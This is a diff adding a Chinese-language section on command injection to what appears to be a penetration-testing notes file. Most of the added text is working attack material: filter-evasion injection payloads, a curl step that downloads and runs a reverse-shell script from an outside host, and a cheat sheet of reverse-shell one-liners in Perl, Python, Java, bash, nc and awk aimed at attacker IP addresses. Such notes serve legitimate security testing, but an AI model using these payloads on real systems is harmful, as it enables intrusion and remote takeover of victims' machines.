@@ -364,6 +364,88 @@ public interface UserMapper {
 
 ## 命令注入
 
+### 验证步骤
+
+1. 使用`;`, `|`或`&&`直接进行命令拼接
+1. 使用`` USERID=`id -u` ``或`USERID=$(uname -a)`进行命令替换
+1. 如果遇到特殊字符校验
+    1. `/`: 在环境中截取, 如当前路径: `xxx;cc=$(pwd);ff=${cc:0:1};mkdir $(ff)tmp$(ff)hackfile;`
+    1. 空格: 使用特殊变量替换: `$ a=$(curl$IFS"http://10.74.201.219:8888/")`
+    1. `;`: 使用十六进制替换: `a=$'\x3b'; echo $a`, 这种方式会被当做字符串来执行
+
+    !!! tip "33种特殊字符`` `~!@#$%^&*()-_=+\|[{}];:'",<.>/?和空格 ``"
+
+1. 如果对特殊字符校验无法 {==反弹shell==}, 可分拆两步
+    1. 上传反弹shell脚本, 保存到指定路径: `xxx$(curl$IFS-o"/tmp/hhack.pl"$IFS"http://x.x.x.x:8888/hhack.pl")`
+    1. 执行脚本: `xxx$(perl$IFS"/tmp/hhack.pl")`
+
+### 反弹shell
+
+reverse shell, 在控制端 **监听端口**, 被控端发起请求到该端口, 并将其命令行的输入输出转到控制端
+
+#### 1. 在攻击端启动监听
+
+```bash
+$ ncat -lvp 53
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::53
+Ncat: Listening on 0.0.0.0:53
+```
+
+#### 2. 在被控端发起连接
+
+##### Perl
+
+```bash
+$ perl -e 'use Socket;$i="192.168.1.128";$p=53;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
+
+# 或写进脚本执行
+$ perl xxx.pl
+```
+
+##### Python
+
+```bash
+$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.128",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+```
+
+##### Java
+
+```java
+public class Revs {
+    public static void main(String[] args) throws Exception {
+        Runtime r = Runtime.getRuntime();
+        String cmd[]= {"/bin/bash","-c","exec 5<>/dev/tcp/x.x.x.x/53;cat <&5 | while read line; do $line 2>&5 >&5; done"};
+        Process p = r.exec(cmd);
+        p.waitFor();
+    }
+}
+```
+
+##### bash
+
+```bash
+$ /bin/bash -i >& /dev/tcp/192.168.1.128/80 0>&1
+```
+
+##### nc
+
+!!! danger "注意需要确认被控机器上已安装nc"
+
+```bash
+$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.128 8080 >/tmp/f
+```
+
+##### awk
+
+```bash
+$ awk 'BEGIN{s="/inet/tcp/0/192.168.1.128/8080";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'
+```
+
+
+!!! quote "参考链接: [你和目标只差一个shell的距离](https://klionsec.github.io/2016/09/27/revese-shell/)"
+
+
 ### Java
 
 ```java
